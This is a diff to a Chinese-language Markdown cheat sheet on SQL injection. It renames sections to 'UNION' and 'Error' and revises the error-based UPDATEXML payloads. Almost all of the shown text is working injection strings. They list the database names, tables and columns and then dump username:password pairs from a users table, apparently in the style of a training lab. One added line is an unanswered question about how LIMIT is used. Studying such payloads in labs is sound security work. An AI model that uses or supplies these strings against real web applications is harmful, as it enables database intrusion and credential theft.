@@ -209,7 +209,7 @@ UPDATE users SET uname = "1" WHERE id = 1;
 >
 > 可尝试二分法.
 
-## 6. SELECT
+## 6. UNION
 
 使用 `UNION` 时推荐查询 `NULL` 以显示 `UNION` 的查询结果
 
@@ -289,14 +289,14 @@ UPDATE users SET uname = "1" WHERE id = 1;
 ?id=NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users) -- 
 ```
 
-## 7. INSERT/UPDATE
+## 7. Error
 
 ### 7.1. Location
 
 判断是否有回显
 
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 0) OR '
 ```
 
 ### 7.2. Database
@@ -304,13 +304,15 @@ UPDATE users SET uname = "1" WHERE id = 1;
 显示所有数据库名
 
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 0x7e), 1) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 0x7e), 0) OR '
 ```
+
+==???LIMIT 的使用???==
 
 显示当前数据库名
 
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, DATABASE(), 0x7e), 1) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, DATABASE(), 0x7e), 0) OR '
 ```
 
 亦可查询以下内容
@@ -328,13 +330,13 @@ UPDATE users SET uname = "1" WHERE id = 1;
 获取指定数据库的所有数据表名
 
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security'), 0x7e), 1) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 0,1), 0x7e), 0) OR '
 ```
 
 获取当前数据库的所有数据表名
 
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()), 0x7e), 1) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), 0x7e), 0) OR '
 ```
 
 ### 7.4. Columns
@@ -342,13 +344,13 @@ UPDATE users SET uname = "1" WHERE id = 1;
 获取指定数据库中指定数据表的所有字段名
 
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 0x7e), 1) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 0x7e), 0) OR '
 ```
 
 获取当前数据库中指定数据表的所有字段名
 
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 0x7e), 1) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 0x7e), 0) OR '
 ```
 
 ### 7.5. Dump
@@ -356,13 +358,13 @@ UPDATE users SET uname = "1" WHERE id = 1;
 获取指定数据库中指定数据表中的所有数据
 
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 0x7e), 1) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 0x7e), 0) OR '
 ```
 
 获取当前数据库中指定数据表中的所有数据
 
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 0x7e), 1) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 0x7e), 0) OR '
 ```
 
 ## 8. Bool
